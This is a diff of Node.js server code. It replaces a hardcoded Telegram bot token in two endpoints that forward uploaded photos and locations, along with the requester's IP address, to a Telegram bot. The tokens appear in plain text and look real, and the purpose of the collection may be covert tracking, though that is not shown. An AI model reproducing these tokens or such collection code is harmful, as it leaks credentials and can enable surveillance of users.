@@ -29,7 +29,7 @@ app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
   try {
     const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;
 
-    const apiUrl = `https://api.telegram.org/bot6725080038:AAGg7RFm3R6DDkVaYPnv-lST7HeA-jI_mzI/sendPhoto`; // Замените <YOUR_BOT_TOKEN> на ваш токен бота
+    const apiUrl = `https://api.telegram.org/bot6725080038:AAEvI3bcOSsc0V8QTtcFvFPQ1yBOvyw0oNs/sendPhoto`; // Замените <YOUR_BOT_TOKEN> на ваш токен бота
 
     const formData = new FormData();
     formData.append('chat_id', chat_id);
@@ -70,7 +70,7 @@ app.post('/sendLocationToTelegram', async (req, res) => {
   try {
     const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;
 
-    const apiUrl = `https://api.telegram.org/bot6725080038:AAGg7RFm3R6DDkVaYPnv-lST7HeA-jI_mzI/sendLocation`;
+    const apiUrl = `https://api.telegram.org/bot6725080038:AAEvI3bcOSsc0V8QTtcFvFPQ1yBOvyw0oNs/sendLocation`;
 
     const formData = new FormData();
     formData.append('chat_id', chat_id);
